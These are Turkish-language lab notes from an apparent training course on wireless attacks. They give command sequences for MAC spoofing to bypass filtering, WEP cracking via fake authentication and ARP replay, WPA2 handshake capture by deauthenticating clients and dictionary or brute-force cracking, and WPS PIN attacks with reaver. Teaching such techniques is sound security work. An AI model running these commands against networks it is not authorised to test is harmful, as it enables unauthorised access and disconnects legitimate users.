---Wireless Network Attacks: 

-Kablosuz ağ sinyalleri eskiden herkese açık bir şekilde yayınlandığı için (radyo gibi) herkes tarafından takip edilebiliyordu.

-Öneri: Tp-Link WN722N, Alpha Chipset (051, 036), Kali Linux Wireless Pen. Testing (Kitap önerisi)

-BSSID: Erişim noktasının (Access Point) MAC adresi.

-ESSID: Erişim noktasının ismi.

=> ifconfig
=> airmon-ng check kill (bize engel olabilecek servisleri kapatır)
=> airmon-ng start wlan0(wireless destekli kartlarımızı monitör modda kullanabilmemizi sağlayan araç)
=> airodump-ng wlan0mon (monitör moddaki sistemlerin yakaladığı bilgileri ekrana aktarır)
-CH: Radyo mantığı; nasıl aynı anda birden fazla kanalı dinleyemiyorsak, wireless'da da 13 kanaldan birini aracın kanallar arası zap yapmasıyla dinleriz.
-Elapsed: Geçen süre.
-Airodump menüsü iki bölüme ayrılır. İlk bölüm AP(erişim noktaları) ile alakalı olan bölümdür. İkinci bölüm erişim noktalarıyla alakalı istemciler ile ilgili olan bölümdür.
-PWD: Erişim noktasının sinyal gücü hakkında bilgi verir. - değer alır, değer yüksekse erişim daha güçlüdür.

-Wireless "full duplex" teknolojisini hala desteklememektedir. (Aynı anda hem veri yollayıp veri alma)

-Beacons: Wireless'daki kontrol paketlerinin sayısını belirten kısım.
-Data: Bilgi alış-verişinin yapıldığı paket sayısı.
-MB: (?)
-ENC: Kullanılan şifreleme hakkında bilgi verir.
-CIPHER: Kullanılan şifrelemenin kullandığı algoritma bilgisini verir.
-ATH: Doğrulama için kullanılan protokolün bilgisini verir.

-ifconfig wlp2s0:1 192.168.0.2 (sanal bir IP interface'i oluşturur)
-ifconfig wlp2s0:1 down (sanal interface'i kaldırır)

-İkinci kısım: BSSID (Erişim noktalarının MAC adresleri, eğer bu alan boşsa client sadece tarama yapıyor demektir).
-STATION: Erişim noktasına bağlanan makinelerin MAC adresleri.
-Rate: 
-Lost: Kayıp paketler.
-Frame: Gelen paketler.
-Probe: ESSID değeri alır, daha önceden bağlanmış olduğu erişim noktaları varsa onları civarda tekrar aratmak için kullanır.

-Eğer ESSID gizlenirse sadece kablosuz yayının ismini bilen kişiler bu kablosuz ağa bağlanabilir. (Probe işlemi)

=> iwconfig wlp2s0 essid "Lyk-2016" (Interface ile erişim noktalarını birbirine bağlar(?))
=> dhclient wlp2s0

=> airodump-ng wlan0mon -c 1 --bssid C0:4A:00:E9:08:2C (filtreleme)

-ESSID'i gözükmeyen <length: 0> bağlantıları izlemeye alırsak, o ağa biri tekrar bağlandığı zaman ESSID'ini öğrenebiliriz.

-MAC Filtreleme: Sadece kaydedilen MAC adreslerine bağlantı izni verir veya bağlantıya kabul etmez.

-MAC filtrelemeyi atlatma: Ağa bağlı bir MAC adresini alıp kendi MAC adresi olarak gösterir.

=> ifconfig interface down
=> ifconfig interface hw ether hedef-MAC (airodump'dan buluyoruz)
=> ifconfig interface up

-Eski haline döndürmek için:
=> ifconfig interface down
=> ifconfig interface hw ether kendi-MAC-adresimiz
=> ifconfig interface up

---Wireshark raporu için:

=> airodump-ng wlan0mon -c 6 --bssid C0:4A:00:E9:08:2C -w isim.pcap (Yayın yakalarsa isim.pcap içerisine kaydeder.) 

-FİLM Önerisi: Enigma

-WEP: IV (Initation vector)Başlığa açık olarak yerleştirilir. Açık olan değerle şifreli değeri kıyaslayarak anahtarı bulmaya çalışıyoruz. WEP'te anahtara ihtiyaç olmadan oturum kurma imkanı vardır. Bu zafiyet bize paket enjeksiyonu yapma imkanı verir.

-WEP Şifresi Kırma Örneği:

=> airmon-ng start wlan0
=> airodump-ng wlan0mon
=> airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 1 -w lyk201wep
=> (Yeni terminal) aireplay-ng --fakeauth 1 -a C0:4A:00:E9:08:2C wlan0mon (paket enjekte etmemizi sağlayan araç)
=> aireplay-ng --arpreplay -b C0:4A:00:E9:08:2C wlan0mon (paket enjekte eder)
=> (64bit için = DATA 5.000, 128bit için = DATA 35.000-40.000) aircrack-ng lyk2016.cap (KEY FOUND!)

-WPA/2: Four-way handshake'e dayanır. Brute-force'a açık. Ağa bağlı bir istemci yoksa kırılamaz.

=> Yukarıdaki işlemleri tekrar et. Ön koşullar: bir istemcinin WPA/2 ağındaki oturumunu baştan sona kaydetmek. Bağlı istemcileri düşürüp tekrar bağlanmasını sağlayarak veya istemcinin bağlanmasını bekleyerek yapılabilir.

-İstemciyi düşürme:

=> aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
=> airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 6 -w lyk201wpa2 (6.kanala geçmiş)
=> aircrack-ng lyk2016wpa4-01.cap -w /usr/share/wordlists/
=> vi /tmp/sozluk.txt
=> aircrack-ng lyk2016wpa4-01.cap -w /tmp/sozluk.txt

---Brute Force:

=> john --incremental --stdout | aircrack-ng lyk2016wpa4-01.cap -b BSSID -w -

---Wireshark filter: wlan 
-Edit
-Preferences
-Protocols
-ieee 802.11
-Decryption Keys: Edit 
-wpa-pwd
-pass:essid

---WPS: 8 bitlik doğruluma kullanılır. 10^7 (1 bit tahminle yaklaşık 8 saatte çözülebilir. İki parça şeklinde, 4 + 3 gönderiliyor. İlk 4'lük doğruysa geri kalan 3 yollanır.

=> wash -i wlan0mon -wps'li AP'leri bulur
=> reaver -i wlan0mon -b BSSID -vv (-p <pin>)
